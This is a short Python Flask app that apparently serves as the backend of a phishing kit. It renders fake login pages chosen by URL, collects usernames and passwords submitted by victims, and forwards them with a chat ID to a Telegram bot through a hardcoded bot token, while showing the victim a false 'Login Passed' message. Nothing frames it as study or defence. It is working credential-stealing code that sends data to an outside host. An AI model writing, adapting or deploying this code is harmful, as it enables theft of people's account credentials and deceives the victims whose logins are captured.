from flask import Flask, render_template, request
import requests
import base64
import io

TOKEN = "8560939710:AAHF8NUj9JeewEx5jQ1XStJpKzFaV3PgknE"

app = Flask(__name__)

@app.route('/login/<page_name>')
def show_page(page_name):
    s_id = request.args.get('id') 
    return render_template(f"{page_name}.html", idt=s_id)

@app.route('/login', methods=['POST'])
def capture():
    s_id = request.form.get('id')
    user = request.form.get('username')
    passw = request.form.get('password')
    
    msg = f"🔔 **New Data Received!**\n\nUser: `{user}`\nCRIND : `{passw}`"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={"chat_id": s_id, "text": msg, "parse_mode": "Markdown"},timeout=8)
        return "<h3>Login Passed : We are checking your account</h3>"
    except:          
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={"chat_id": s_id, "text": "Something want wrong", "parse_mode": "Markdown"},timeout=8)
                      
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000 , debug=True)